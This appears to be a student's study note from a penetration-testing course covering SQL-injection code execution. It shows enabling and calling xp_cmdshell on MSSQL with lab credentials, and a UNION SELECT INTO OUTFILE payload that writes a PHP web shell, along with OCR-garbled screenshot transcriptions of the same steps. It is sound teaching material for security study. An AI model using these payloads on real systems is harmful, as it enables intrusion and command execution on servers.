# Manual code execution

10.3.1. Manual code execution
Depending on the underlying database system we are targeting, we need to adapt our strategy to obtain code execution.

In Microsoft SQL Server, the xp_cmdshell function takes a string and passes it to a command shell for execution. The function returns any output as rows of text. The function is disabled by default and once enabled, it must be called with the EXECUTE keyword instead of SELECT.

In our database, the Administrator user already has the appropriate permissions. Let's enable xp_cmdshell by simulating an SQL injection via the impacket-mssqlclient tool.

> [!note]- Screenshot
> ```
> In our database, the Administrator user already has the appropriate permissions.
> Let's enable xp_cmdshell by simulating an SQL injection via the impacket-
> mssalclient tool.
> 
> kaligkali:~§ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-au
> 
> th
> 
> Impacket v@.9.24 - Copyright 2021 SecureAuth Corporation
> 
> SQL> EXECUTE sp_configure ‘show advanced options", 1;
> 
> [*] INFO(SQLO1\SQLEXPRESS): Line 185: Configuration option ‘show advanced option
> 
> s’ changed from @ to 1. Run the RECONFIGURE statement to install.
> 
> SQL> RECONFIGURES
> 
> SQL> EXECUTE sp_configure ‘xp_cndshell’, 15
> 
> [*] INFO(SQLO1\SQLEXPRESS): Line 185: Configuration option ‘xp_cmdshell’ changed
> 
> from @ to 1. Run the RECONFIGURE statement to install.
> 
> ‘SQL> RECONFIGURES
> 
> Listing 28 - Enabling xp_cmdshell feature
> 
> After logging in from our Kali VM to the MSSQL instance, we can enable show
> advanced options by setting its value to 1, then applying the changes to the
> running configuration via the RECONFIGURE statement. Next, we'll enable
> xp_cmdshell and apply the configuration again using RECONFIGURE.
> ```


```sh
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

After logging in from our Kali VM to the MSSQL instance, we can enable show advanced options by setting its value to 1, then applying the changes to the running configuration via the RECONFIGURE statement. Next, we'll enable xp_cmdshell and apply the configuration again using RECONFIGURE.

With this feature enabled, we can execute any Windows shell command through the EXECUTE statement followed by the feature name.

> [!note]- Screenshot
> ```
> With this feature enabled, we can execute any Windows shell command through
> the EXECUTE statement followed by the feature name.
> 
> SQL> EXECUTE xp_cmdshell ‘whoami*;
> 
> output.
> 
> nt service\mssql$sqlexpress
> 
> NULL
> 
> Listing 29 - Executing Commands via xp_cmdshell
> 
> Since we have full control over the system, we can now easily upgrade our SQL
> shell to a more standard reverse shell.
> ```


## EXECUTE xp_cmdshell 'whoami';

' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //

<? system($_REQUEST['cmd']); ?>

The PHP system function will parse any statement included in the cmd parameter coming from the client HTTP REQUEST, thus acting like a web-interactive command shell.

> [!note]- Screenshot
> ```
> Although the various MySQL database variants don't offer a single function to
> escalate to RCE, we can abuse the SELECT INTO_OUTFILE statement to write files
> on the web server.
> 
> For this attack to work, the file location must be writable to the
> 
> OS user running the database software.
> As an example, let's resume the UNION payload on our MySQL target application
> we explored previously, expanding the query that writes a webshell on disk.
> ```


> [!note]- Screenshot
> ```
> We'll issue the UNION SELECT SQL keywords to include a single PHP line into the
> first column and save it as webshell.php in a writable web folder.
> 
> * UNION SELECT “<?php system($_GET["cmd"]);?>", null, null, null, null INTO OUTF
> 
> ILE “/var/wwa/htm1/tmp/webshell. php” -- //
> 
> Listing 30 - Write a WebShell To Disk via INTO OUTFILE directive
> The written PHP code file results in the following:
> | <? system($_REQUEST[cmd"]); ?>
> Listing 31 - PHP web shell
> 
> The PHP system function will parse any statement included in the cmd parameter
> coming from the client HTTP REQUEST, thus acting like a web-interactive
> command shell.
> ```


> [!note]- Screenshot
> ```
> If we try to use the above payload inside the Lookup field of the search.php
> endpoint, we receive the following error:
> Walt REM Bal Fors BL Kai Does Netter. OMemiveSery AMSEU #Expi-08 «HOR
> 
> fatal error: Uncaught TypeError: mysqli fetch_array(): Argument #1 (Sresult) must be of type
> 
> iheml/search php(161) mysqii_fetch-array() #1 (main) thrown in /var/www/html/search. php
> 
> online 102
> 
> Figure 17: Writing the WebShell to Disk
> 
> Fortunately, this error is related to the incorrect return type and should not impact
> writing the webshell on disk.
> ```


> [!note]- Screenshot
> ```
> To confirm, we can access the newly created webshell inside the tmp folder
> along with the id command.
> cB > @ © & 192168:120.9
> BWKaliLinux TVKaliToo's RVKali Forums Kali Docs @INetHunter JL Offensive Security LMSFU #Exploit-D8 4 GHOB
> juid=33(www-data) gid=33(www-data) groups=33(www-data) \N \N \N \N
> 
> Figure 18: Accessing the Webshell
> Great! The webshell is working as expected since the output of the id command is
> returned to us through the web browser. We discovered that we are executing
> commands as the www-data user, an identity commonly associated with web
> servers on Linux systems.
> Now that we understand how to leverage SQLi to manually obtain command
> execution, let's discover how to automate the process with specific tools.
> ```

---
%% graph-links %%
## Related
- [[Automating the attack]]
- [[UNION-based payloads]]
- [[Command Injection]]

> [!info] Navigation
> Section: [[SQL Injection Attacks/Manual and automated code execution/_index|Manual and automated code execution]] · Home: [[🏠 Home]]

